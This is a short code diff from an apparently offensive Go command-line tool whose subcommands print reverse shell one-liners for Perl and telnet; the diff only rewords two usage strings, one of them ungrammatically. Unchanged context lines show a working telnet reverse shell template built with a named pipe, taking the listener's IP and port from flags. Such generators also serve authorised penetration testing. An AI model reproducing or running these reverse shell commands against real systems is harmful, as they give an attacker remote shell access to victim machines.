@@ -84,7 +84,7 @@ func main() {
 		},
 		{
 			Name:  "perl",
-			Usage: "Generate a Perl reverse shell",
+			Usage: "Generate Perl reverse shells",
 			Flags: myFlags,
 			Action: func(c *cli.Context) error {
 				fmt.Print(fmt.Sprint(Magenta("-- for Linux (and maybe Windows):\n")))
@@ -98,7 +98,7 @@ func main() {
 		},
 		{
 			Name:  "telnet",
-			Usage: "Generate telnet reverse shells",
+			Usage: "Generate a telnet reverse shells",
 			Flags: myFlags,
 			Action: func(c *cli.Context) error {
 				fmt.Printf("rm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0/tmp/p\n", c.String("ip"), c.String("port"))
